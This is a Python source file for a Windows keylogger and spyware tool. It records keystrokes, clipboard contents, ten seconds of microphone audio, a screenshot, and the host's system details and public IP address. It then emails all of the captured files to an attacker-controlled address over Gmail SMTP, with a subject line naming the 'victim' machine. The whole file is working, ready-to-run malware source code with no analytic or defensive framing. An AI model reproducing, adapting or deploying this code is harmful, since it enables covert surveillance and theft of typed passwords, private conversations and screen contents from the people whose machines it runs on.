# Liabraries

from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import os

from scipy.io.wavfile import write
import sounddevice as sd


import getpass
from requests import get

from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

email_address = os.environ['email']  # Enter disposable email here (Fetching email from environment variable)
password = os.environ['email_pass']  # Enter email password here   (Fetching password from environment variable)

username = getpass.getuser()

toaddr = os.environ['email']  # Enter the email address you want to send your information to

file_path = "F:\\PycharmProjects\\Simple_keylogger"
extend = "\\"

# email controls
def send_email():
    files = [keys_information, system_information, clipboard_information, screenshot_information, audio_information]
    fromaddr = email_address
    toaddrs = toaddr

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddrs

    msg['Subject'] = "Information about " + victim

    body = "Here is the information"

    msg.attach(MIMEText(body, 'plain'))


    for f in files:
        dir_path = os.path.join(file_path + extend, f)
        attachment = MIMEApplication(open(dir_path, "rb").read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename=f)
        msg.attach(attachment)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddrs, text)

    s.quit()




# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
        return hostname


victim = computer_information()


# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")


copy_clipboard()


# get the microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


microphone()


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

send_email()


count = 0
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()